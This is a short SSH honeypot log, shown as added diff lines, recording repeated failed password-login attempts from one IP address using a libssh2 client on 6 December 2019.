+2019-12-06 18:51:22.413 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:51:22.413 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:51:22.414 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:51:22.644 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:52:03.003 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:52:04.688 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:52:04.692 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:52:04.693 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:52:04.924 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:52:43.645 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:52:45.249 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:52:45.250 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:52:45.251 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:52:45.484 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:53:28.000 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:53:28.754 - [Debug] [Connection] Attacker closed the connection
